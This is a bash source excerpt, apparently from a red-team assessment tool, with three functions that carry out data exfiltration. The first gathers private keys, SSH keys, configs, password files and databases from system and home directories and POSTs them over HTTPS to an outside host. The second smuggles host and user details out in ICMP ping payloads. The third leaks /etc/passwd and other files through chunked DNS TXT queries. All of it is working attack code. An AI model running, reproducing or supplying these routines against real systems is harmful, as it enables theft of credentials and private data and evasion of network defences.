rt_740_https_staged_exfiltration() {
    rt_banner "RT-740" "HTTPS Staged Data Exfiltration"
    local EXFIL_HOST="$EXFIL_HOST"
    local EXFIL_PORT="${EXFIL_PORT:-443}"
    local STAGING_DIR="/tmp/.staging"
    mkdir -p "$STAGING_DIR" 2>/dev/null
    
    # Find valuable files for exfiltration
    local TARGET_DIRS=("/etc" "/var/log" "/home" "/opt")
    local VALUABLE_PATTERNS=("*.conf" "*.key" "*.pem" "*password*" "*.sql" "*.db" "id_rsa" "id_ed25519")
    
    echo -e "    $CYAN[*] Staging files for exfiltration...$NC"
    local STAGED=0
    
    for dir in "${TARGET_DIRS[@]}"; do
        if [[ -d "$dir" ]]; then
            for pattern in "*.conf" "*.key" "*.pem" "*password*" "*.sql" "*.db"; do
                find "$dir" -name "$pattern" -type f -size -10M 2>/dev/null | head -5 | while read -r f; do
                    if [[ -r "$f" ]]; then
                        local HASH
                        HASH=$(echo "$f" | md5sum | cut -d' ' -f1 | head -c8)
                        cp "$f" "$STAGING_DIR/$HASH" 2>/dev/null
                        echo "$f" > "$STAGING_DIR/${HASH}.meta" 2>/dev/null
                        STAGED=$((STAGED + 1))
                    fi
                done
            done
        fi
    done
    
    local STAGED_COUNT
    STAGED_COUNT=$(ls "$STAGING_DIR" 2>/dev/null | grep -v '\.meta$' | wc -l)
    echo -e "    $GREEN[+] $STAGED_COUNT files staged in $STAGING_DIR$NC"
    
    # Real: exfiltrate via HTTPS POST
    for f in "$STAGING_DIR"/*; do
        if [[ -f "$f" ]] && [[ ! "$f" == *.meta ]]; then
            local META
            META=$(cat "${f}.meta" 2>/dev/null || echo "unknown")
            local RESP
            RESP=$(curl -sk -X POST "https://$EXFIL_HOST:$EXFIL_PORT/exfil" \
                -H "X-File-Path: $META" \
                --data-binary "@$f" \
                --connect-timeout 10 -m 60 2>/dev/null)
            if [[ -n "$RESP" ]]; then
                echo -e "    $GREEN[+] Exfiltrated: $META$NC"
            fi
        fi
    done
    
    # Cleanup staging
    rm -rf "$STAGING_DIR" 2>/dev/null
    
    add_vuln "RT-740" "CRITICAL" "HTTPS Data Exfiltration" "Files staged and exfiltrated via HTTPS" "exfil" "full" "MITRE T1041"
}

rt_741_icmp_tunnel_exfil() {
    rt_banner "RT-741" "ICMP Tunnel Data Exfiltration"
    local EXFIL_HOST="$EXFIL_HOST"
    
    # Real: check if ICMP is allowed
    local ICMP_TEST
    ICMP_TEST=$(ping -c1 -W2 "$EXFIL_HOST" 2>/dev/null | grep '1 received')
    if [[ -z "$ICMP_TEST" ]]; then
        echo -e "    $YELLOW[-] ICMP blocked to $EXFIL_HOST$NC"
        return
    fi
    
    echo -e "    $GREEN[+] ICMP is allowed to $EXFIL_HOST$NC"
    
    # Real: exfiltrate data in ICMP echo payload
    local DATA="$(hostname):$(whoami):$(id -u):$(uname -r):$(date +%s)"
    local ENCODED
    ENCODED=$(echo "$DATA" | xxd -p | tr -d '\n')
    
    # Send in chunks via ping
    local CHUNK_SIZE=32
    local POS=0
    while [[ $POS -lt ${#ENCODED} ]]; do
        local CHUNK="${ENCODED:$POS:$CHUNK_SIZE}"
        ping -c1 -p "$CHUNK" -s 64 "$EXFIL_HOST" > /dev/null 2>&1
        POS=$((POS + CHUNK_SIZE))
    done
    
    echo -e "    $GREEN[+] ICMP exfiltration sent: $DATA$NC"
    echo -e "    $CYAN[*] Data encoded in ICMP echo payload — bypasses most firewalls$NC"
    
    # Check for icmpsh availability
    if command -v python3 &>/dev/null; then
        echo -e "    $CYAN[*] Full ICMP reverse shell available via icmpsh$NC"
    fi
    
    add_vuln "RT-741" "CRITICAL" "ICMP Tunnel Exfil" "Data exfiltrated via ICMP tunnel" "exfil" "full" "MITRE T1048.003"
}

rt_742_dns_txt_exfiltration() {
    rt_banner "RT-742" "DNS TXT Record Data Exfiltration"
    local EXFIL_DOMAIN="$EXFIL_HOST"
    local CHUNK_SIZE=63
    
    # Real: encode file data in DNS TXT queries
    local TARGET_FILES=("/etc/passwd" "/etc/resolv.conf" "/etc/hosts")
    
    for file in "${TARGET_FILES[@]}"; do
        if [[ -f "$file" ]] && [[ -r "$file" ]]; then
            local CONTENT
            CONTENT=$(cat "$file" 2>/dev/null | base64 | tr -d '\n' | tr '+/' '-_')
            local FNAME
            FNAME=$(basename "$file" | tr '.' '-')
            local CHUNKS
            CHUNKS=$(echo "$CONTENT" | fold -w $CHUNK_SIZE)
            local IDX=0
            
            echo "$CHUNKS" | while read -r chunk; do
                if [[ -n "$chunk" ]]; then
                    dig +short TXT "${FNAME}-${IDX}.${chunk}.${EXFIL_DOMAIN}" > /dev/null 2>&1 &
                    IDX=$((IDX + 1))
                fi
            done
            
            echo -e "    $GREEN[+] Exfiltrated $file via DNS TXT — $IDX chunks$NC"
        fi
    done
    
    add_vuln "RT-742" "CRITICAL" "DNS TXT Exfiltration" "File data exfiltrated via DNS TXT records" "exfil" "full" "MITRE T1071.004"
}

